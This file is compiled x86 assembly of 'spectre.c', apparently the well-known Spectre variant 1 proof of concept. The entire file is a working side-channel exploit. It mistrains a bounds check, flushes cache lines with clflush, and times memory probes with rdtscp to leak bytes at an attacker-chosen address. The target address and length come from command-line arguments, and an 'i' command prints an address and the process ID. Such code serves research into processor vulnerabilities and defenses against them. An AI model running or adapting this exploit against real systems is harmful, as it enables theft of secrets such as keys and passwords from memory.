	.file	"spectre.c"
	.text
	.globl	check
	.type	check, @function
check:
.LFB5562:
	.cfi_startproc
	call	__x86.get_pc_thunk.ax
	addl	$_GLOBAL_OFFSET_TABLE_, %eax
	movl	array1_size@GOTOFF(%eax), %eax
	cmpl	4(%esp), %eax
	seta	%al
	movzbl	%al, %eax
	ret
	.cfi_endproc
.LFE5562:
	.size	check, .-check
	.globl	leak_data
	.type	leak_data, @function
leak_data:
.LFB5563:
	.cfi_startproc
	pushl	%ebx
	.cfi_def_cfa_offset 8
	.cfi_offset 3, -8
	call	__x86.get_pc_thunk.ax
	addl	$_GLOBAL_OFFSET_TABLE_, %eax
	movl	8(%esp), %edx
	movl	array1_size@GOTOFF(%eax), %ecx
	movl	%edx, %ebx
	addl	12(%esp), %ebx
	cmpl	%ecx, %ebx
	jnb	.L2
	movzbl	array1@GOTOFF(%eax,%edx), %edx
	sall	$9, %edx
	movzbl	array2@GOTOFF(%eax,%edx), %edx
	andb	%dl, temp@GOTOFF(%eax)
.L2:
	popl	%ebx
	.cfi_restore 3
	.cfi_def_cfa_offset 4
	ret
	.cfi_endproc
.LFE5563:
	.size	leak_data, .-leak_data
	.globl	victim_function
	.type	victim_function, @function
victim_function:
.LFB5564:
	.cfi_startproc
	call	__x86.get_pc_thunk.ax
	addl	$_GLOBAL_OFFSET_TABLE_, %eax
	movzbl	temp1@GOTOFF(%eax), %eax
	pushl	%eax
	.cfi_def_cfa_offset 8
	pushl	8(%esp)
	.cfi_def_cfa_offset 12
	call	leak_data
	addl	$8, %esp
	.cfi_def_cfa_offset 4
	ret
	.cfi_endproc
.LFE5564:
	.size	victim_function, .-victim_function
	.globl	readMemoryByte
	.type	readMemoryByte, @function
readMemoryByte:
.LFB5565:
	.cfi_startproc
	pushl	%ebp
	.cfi_def_cfa_offset 8
	.cfi_offset 5, -8
	pushl	%edi
	.cfi_def_cfa_offset 12
	.cfi_offset 7, -12
	pushl	%esi
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	pushl	%ebx
	.cfi_def_cfa_offset 20
	.cfi_offset 3, -20
	subl	$76, %esp
	.cfi_def_cfa_offset 96
	call	__x86.get_pc_thunk.bx
	addl	$_GLOBAL_OFFSET_TABLE_, %ebx
	movl	%ebx, 16(%esp)
	movl	100(%esp), %eax
	movl	%eax, 40(%esp)
	movl	104(%esp), %eax
	movl	%eax, 44(%esp)
	movl	%gs:20, %eax
	movl	%eax, 60(%esp)
	xorl	%eax, %eax
	movl	$0, 52(%esp)
	leal	results.0@GOTOFF(%ebx), %eax
	leal	1024(%eax), %edx
.L7:
	movl	$0, (%eax)
	addl	$4, %eax
	cmpl	%eax, %edx
	jne	.L7
	movl	$999, 28(%esp)
	movl	16(%esp), %eax
	leal	array2@GOTOFF(%eax), %eax
	movl	%eax, 36(%esp)
	jmp	.L8
.L10:
	movl	%ebp, %eax
	imull	%ebx
	movl	%ebp, %eax
	sarl	$31, %eax
	subl	%eax, %edx
	leal	(%edx,%edx,2), %edx
	addl	%edx, %edx
	movl	%ebp, %eax
	subl	%edx, %eax
	subl	$1, %eax
	movl	%eax, %ecx
	movw	$0, %cx
	shrl	$16, %eax
	movl	%edi, %edx
	xorl	96(%esp), %edx
	orl	%ecx, %eax
	andl	%eax, %edx
	movl	16(%esp), %eax
	movb	$0, temp1@GOTOFF(%eax)
	xorl	%edi, %edx
	pushl	%edx
	.cfi_def_cfa_offset 100
	call	victim_function
	subl	$1, %ebp
	addl	$4, %esp
	.cfi_def_cfa_offset 96
	cmpl	$-1, %ebp
	je	.L31
.L12:
	clflush	(%esi)
	movl	$0, 56(%esp)
	movl	56(%esp), %eax
	cmpl	$99, %eax
	jg	.L10
.L11:
	movl	56(%esp), %eax
	addl	$1, %eax
	movl	%eax, 56(%esp)
	movl	56(%esp), %eax
	cmpl	$99, %eax
	jle	.L11
	jmp	.L10
.L31:
	movl	$13, %esi
	movl	16(%esp), %eax
	leal	results.0@GOTOFF(%eax), %eax
	movl	%eax, 24(%esp)
	movl	%ebp, 32(%esp)
	movl	%esi, %ebx
	movl	36(%esp), %ebp
	jmp	.L14
.L33:
	movl	24(%esp), %eax
	addl	$1, (%eax,%esi,4)
.L13:
	addl	$167, %ebx
	cmpl	$42765, %ebx
	je	.L32
.L14:
	movzbl	%bl, %esi
	movl	%esi, %edi
	sall	$9, %edi
	rdtscp
	movl	%eax, 8(%esp)
	movl	%edx, 12(%esp)
	movl	%ecx, 52(%esp)
	movzbl	0(%ebp,%edi), %eax
	rdtscp
	movl	%ecx, 52(%esp)
	subl	8(%esp), %eax
	sbbl	12(%esp), %edx
	movl	%edx, %ecx
	movl	%eax, %edx
	movl	$100, %eax
	cmpl	%edx, %eax
	movl	$0, %eax
	sbbl	%ecx, %eax
	jc	.L13
	movl	16(%esp), %edi
	movl	array1_size@GOTOFF(%edi), %ecx
	movl	20(%esp), %eax
	cltd
	idivl	%ecx
	movzbl	array1@GOTOFF(%edi,%edx), %eax
	cmpl	%esi, %eax
	jne	.L33
	jmp	.L13
.L32:
	movl	32(%esp), %ebp
	movl	$0, %eax
	movl	$0, %edx
	movl	16(%esp), %ebx
	leal	results.0@GOTOFF(%ebx), %ebx
	jmp	.L15
.L21:
	movl	%edx, %ebp
	movl	%eax, %edx
.L15:
	addl	$1, %eax
	cmpl	$256, %eax
	je	.L34
	testl	%edx, %edx
	js	.L21
	movl	16(%esp), %esi
	movl	results.0@GOTOFF(%esi,%eax,4), %ecx
	cmpl	(%ebx,%edx,4), %ecx
	jge	.L22
	testl	%ebp, %ebp
	js	.L23
	cmpl	(%ebx,%ebp,4), %ecx
	cmovge	%eax, %ebp
	jmp	.L15
.L22:
	movl	%edx, %ebp
	movl	%eax, %edx
	jmp	.L15
.L23:
	movl	%eax, %ebp
	jmp	.L15
.L34:
	movl	16(%esp), %eax
	leal	results.0@GOTOFF(%eax), %ecx
	movl	(%ecx,%ebp,4), %eax
	movl	(%ecx,%edx,4), %ecx
	leal	4(%eax,%eax), %ebx
	cmpl	%ecx, %ebx
	jl	.L18
	testl	%eax, %eax
	jne	.L24
	cmpl	$2, %ecx
	je	.L18
.L24:
	subl	$1, 28(%esp)
	je	.L18
.L8:
	movl	28(%esp), %eax
	movl	%eax, 20(%esp)
	movl	16(%esp), %eax
	leal	array2@GOTOFF(%eax), %eax
	leal	131072(%eax), %edx
.L9:
	clflush	(%eax)
	addl	$512, %eax
	cmpl	%edx, %eax
	jne	.L9
	movl	16(%esp), %ebx
	movl	array1_size@GOTOFF(%ebx), %esi
	movl	20(%esp), %eax
	cltd
	idivl	%esi
	movl	%edx, %edi
	movl	$29, %ebp
	leal	array1_size@GOTOFF(%ebx), %esi
	movl	$715827883, %ebx
	jmp	.L12
.L18:
	movl	16(%esp), %ebx
	movl	results.0@GOTOFF(%ebx), %eax
	xorl	52(%esp), %eax
	movl	%eax, results.0@GOTOFF(%ebx)
	movl	40(%esp), %esi
	movb	%dl, (%esi)
	leal	results.0@GOTOFF(%ebx), %eax
	movl	(%eax,%edx,4), %edx
	movl	44(%esp), %ecx
	movl	%edx, (%ecx)
	movl	%ebp, %ebx
	movb	%bl, 1(%esi)
	movl	(%eax,%ebp,4), %eax
	movl	%eax, 4(%ecx)
	movl	60(%esp), %eax
	subl	%gs:20, %eax
	jne	.L35
	addl	$76, %esp
	.cfi_remember_state
	.cfi_def_cfa_offset 20
	popl	%ebx
	.cfi_restore 3
	.cfi_def_cfa_offset 16
	popl	%esi
	.cfi_restore 6
	.cfi_def_cfa_offset 12
	popl	%edi
	.cfi_restore 7
	.cfi_def_cfa_offset 8
	popl	%ebp
	.cfi_restore 5
	.cfi_def_cfa_offset 4
	ret
.L35:
	.cfi_restore_state
	call	__stack_chk_fail_local
	.cfi_endproc
.LFE5565:
	.size	readMemoryByte, .-readMemoryByte
	.section	.rodata.str1.1,"aMS",@progbits,1
.LC0:
	.string	"Success"
.LC1:
	.string	"Unclear"
	.section	.rodata.str1.4,"aMS",@progbits,1
	.align 4
.LC2:
	.string	"Putting '%s' in memory, address %p\n"
	.section	.rodata.str1.1
.LC3:
	.string	"%p"
.LC4:
	.string	"%d"
	.section	.rodata.str1.4
	.align 4
.LC5:
	.string	"Trying malicious_x = %p, len = %d\n"
	.section	.rodata.str1.1
.LC6:
	.string	"Reading %d bytes:\n"
	.section	.rodata.str1.4
	.align 4
.LC7:
	.string	"Reading at malicious_x = %p secc= %c ..."
	.section	.rodata.str1.1
.LC8:
	.string	"%s: "
.LC9:
	.string	"0x%02X='%c' score=%d "
	.section	.rodata.str1.4
	.align 4
.LC10:
	.string	"(second best: 0x%02X='%c' score=%d)"
	.section	.rodata.str1.1
.LC11:
	.string	"\n"
.LC12:
	.string	"addr = %llx, pid = %d\n"
	.text
	.globl	main
	.type	main, @function
main:
.LFB5566:
	.cfi_startproc
	leal	4(%esp), %ecx
	.cfi_def_cfa 1, 0
	andl	$-16, %esp
	pushl	-4(%ecx)
	pushl	%ebp
	movl	%esp, %ebp
	.cfi_escape 0x10,0x5,0x2,0x75,0
	pushl	%edi
	pushl	%esi
	pushl	%ebx
	pushl	%ecx
	.cfi_escape 0xf,0x3,0x75,0x70,0x6
	.cfi_escape 0x10,0x7,0x2,0x75,0x7c
	.cfi_escape 0x10,0x6,0x2,0x75,0x78
	.cfi_escape 0x10,0x3,0x2,0x75,0x74
	subl	$72, %esp
	call	__x86.get_pc_thunk.bx
	addl	$_GLOBAL_OFFSET_TABLE_, %ebx
	movl	(%ecx), %eax
	movl	%eax, -80(%ebp)
	movl	4(%ecx), %eax
	movl	%eax, -84(%ebp)
	movl	%gs:20, %eax
	movl	%eax, -28(%ebp)
	xorl	%eax, %eax
	movb	$5, temp1@GOTOFF(%ebx)
	movl	stdin@GOT(%ebx), %eax
	movl	%eax, -64(%ebp)
	leal	check@GOTOFF(%ebx), %eax
	movl	%eax, -76(%ebp)
.L37:
	subl	$12, %esp
	movl	-64(%ebp), %eax
	pushl	(%eax)
	call	getc@PLT
	addl	$16, %esp
	cmpb	$114, %al
	je	.L56
	cmpb	$10, %al
	je	.L37
	cmpb	$105, %al
	jne	.L48
	call	getpid@PLT
	subl	$12, %esp
	pushl	%eax
	movl	-76(%ebp), %eax
	cltd
	addl	$33, %eax
	adcl	$0, %edx
	pushl	%edx
	pushl	%eax
	leal	.LC12@GOTOFF(%ebx), %eax
	pushl	%eax
	pushl	$1
	call	__printf_chk@PLT
	addl	$32, %esp
	jmp	.L37
.L56:
	movl	secret@GOTOFF(%ebx), %eax
	pushl	%eax
	pushl	%eax
	leal	.LC2@GOTOFF(%ebx), %eax
	pushl	%eax
	pushl	$1
	call	__printf_chk@PLT
	movl	secret@GOTOFF(%ebx), %eax
	leal	array1@GOTOFF(%ebx), %ecx
	movl	%eax, %edx
	subl	%ecx, %edx
	movl	%edx, -48(%ebp)
	movl	%eax, (%esp)
	call	strlen@PLT
	addl	$16, %esp
	movl	%eax, -44(%ebp)
	leal	array2@GOTOFF(%ebx), %eax
	leal	131072(%eax), %edx
.L39:
	movb	$1, (%eax)
	addl	$1, %eax
	cmpl	%edx, %eax
	jne	.L39
	cmpl	$3, -80(%ebp)
	je	.L57
.L40:
	subl	$4, %esp
	pushl	-44(%ebp)
	leal	.LC6@GOTOFF(%ebx), %eax
	pushl	%eax
	pushl	$1
	call	__printf_chk@PLT
	movl	-44(%ebp), %eax
	subl	$1, %eax
	movl	%eax, -44(%ebp)
	addl	$16, %esp
	testl	%eax, %eax
	js	.L37
	movl	$0, -60(%ebp)
	leal	.LC7@GOTOFF(%ebx), %eax
	movl	%eax, -68(%ebp)
	leal	.LC1@GOTOFF(%ebx), %eax
	movl	%eax, -72(%ebp)
	jmp	.L46
.L57:
	subl	$4, %esp
	leal	-48(%ebp), %eax
	pushl	%eax
	leal	.LC3@GOTOFF(%ebx), %eax
	pushl	%eax
	movl	-84(%ebp), %esi
	pushl	4(%esi)
	call	__isoc99_sscanf@PLT
	leal	array1@GOTOFF(%ebx), %eax
	subl	%eax, -48(%ebp)
	addl	$12, %esp
	leal	-44(%ebp), %eax
	pushl	%eax
	leal	.LC4@GOTOFF(%ebx), %eax
	pushl	%eax
	pushl	8(%esi)
	call	__isoc99_sscanf@PLT
	pushl	-44(%ebp)
	pushl	-48(%ebp)
	leal	.LC5@GOTOFF(%ebx), %eax
	pushl	%eax
	pushl	$1
	call	__printf_chk@PLT
	addl	$32, %esp
	jmp	.L40
.L44:
	subl	$8, %esp
	leal	.LC11@GOTOFF(%ebx), %eax
	pushl	%eax
	pushl	$1
	call	__printf_chk@PLT
	movl	-44(%ebp), %eax
	subl	$1, %eax
	movl	%eax, -44(%ebp)
	addl	$16, %esp
	testl	%eax, %eax
	js	.L37
.L46:
	movl	secret@GOTOFF(%ebx), %eax
	movl	-60(%ebp), %edi
	movsbl	(%eax,%edi), %eax
	pushl	%eax
	pushl	-48(%ebp)
	pushl	-68(%ebp)
	pushl	$1
	call	__printf_chk@PLT
	addl	$1, %edi
	movl	%edi, -60(%ebp)
	movl	-48(%ebp), %eax
	leal	1(%eax), %edx
	movl	%edx, -48(%ebp)
	addl	$12, %esp
	leal	-40(%ebp), %edx
	pushl	%edx
	leal	-30(%ebp), %edx
	pushl	%edx
	pushl	%eax
	call	readMemoryByte
	movl	-40(%ebp), %edi
	movl	-36(%ebp), %esi
	leal	(%esi,%esi), %eax
	addl	$12, %esp
	cmpl	%eax, %edi
	leal	.LC0@GOTOFF(%ebx), %eax
	cmovl	-72(%ebp), %eax
	pushl	%eax
	leal	.LC8@GOTOFF(%ebx), %eax
	pushl	%eax
	pushl	$1
	call	__printf_chk@PLT
	movzbl	-30(%ebp), %eax
	leal	-32(%eax), %edx
	cmpb	$94, %dl
	movl	$63, %edx
	cmovbe	%eax, %edx
	movl	%edi, (%esp)
	movzbl	%dl, %edx
	pushl	%edx
	movzbl	%al, %eax
	pushl	%eax
	leal	.LC9@GOTOFF(%ebx), %eax
	pushl	%eax
	pushl	$1
	call	__printf_chk@PLT
	addl	$32, %esp
	testl	%esi, %esi
	jle	.L44
	movzbl	-29(%ebp), %eax
	leal	-32(%eax), %edx
	cmpb	$94, %dl
	movl	$63, %edx
	cmovbe	%eax, %edx
	subl	$12, %esp
	pushl	%esi
	movzbl	%dl, %edx
	pushl	%edx
	movzbl	%al, %eax
	pushl	%eax
	leal	.LC10@GOTOFF(%ebx), %eax
	pushl	%eax
	pushl	$1
	call	__printf_chk@PLT
	addl	$32, %esp
	jmp	.L44
.L48:
	movl	-28(%ebp), %eax
	subl	%gs:20, %eax
	jne	.L58
	movl	$0, %eax
	leal	-16(%ebp), %esp
	popl	%ecx
	.cfi_remember_state
	.cfi_restore 1
	.cfi_def_cfa 1, 0
	popl	%ebx
	.cfi_restore 3
	popl	%esi
	.cfi_restore 6
	popl	%edi
	.cfi_restore 7
	popl	%ebp
	.cfi_restore 5
	leal	-4(%ecx), %esp
	.cfi_def_cfa 4, 4
	ret
.L58:
	.cfi_restore_state
	call	__stack_chk_fail_local
	.cfi_endproc
.LFE5566:
	.size	main, .-main
	.local	results.0
	.comm	results.0,1024,32
	.globl	temp1
	.bss
	.type	temp1, @object
	.size	temp1, 1
temp1:
	.zero	1
	.globl	temp
	.type	temp, @object
	.size	temp, 1
temp:
	.zero	1
	.globl	secret
	.section	.rodata.str1.4
	.align 4
.LC13:
	.string	"The Magic Words are Squeamish Ossifrage."
	.section	.data.rel.local,"aw"
	.align 4
	.type	secret, @object
	.size	secret, 4
secret:
	.long	.LC13
	.globl	array2
	.bss
	.align 32
	.type	array2, @object
	.size	array2, 131072
array2:
	.zero	131072
	.globl	unused2
	.align 32
	.type	unused2, @object
	.size	unused2, 64
unused2:
	.zero	64
	.globl	array1
	.data
	.align 32
	.type	array1, @object
	.size	array1, 160
array1:
	.string	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	143
	.globl	unused1
	.bss
	.align 32
	.type	unused1, @object
	.size	unused1, 64
unused1:
	.zero	64
	.globl	array1_size
	.data
	.align 4
	.type	array1_size, @object
	.size	array1_size, 4
array1_size:
	.long	16
	.section	.text.__x86.get_pc_thunk.ax,"axG",@progbits,__x86.get_pc_thunk.ax,comdat
	.globl	__x86.get_pc_thunk.ax
	.hidden	__x86.get_pc_thunk.ax
	.type	__x86.get_pc_thunk.ax, @function
__x86.get_pc_thunk.ax:
.LFB5567:
	.cfi_startproc
	movl	(%esp), %eax
	ret
	.cfi_endproc
.LFE5567:
	.section	.text.__x86.get_pc_thunk.bx,"axG",@progbits,__x86.get_pc_thunk.bx,comdat
	.globl	__x86.get_pc_thunk.bx
	.hidden	__x86.get_pc_thunk.bx
	.type	__x86.get_pc_thunk.bx, @function
__x86.get_pc_thunk.bx:
.LFB5568:
	.cfi_startproc
	movl	(%esp), %ebx
	ret
	.cfi_endproc
.LFE5568:
	.hidden	__stack_chk_fail_local
	.ident	"GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0"
	.section	.note.GNU-stack,"",@progbits
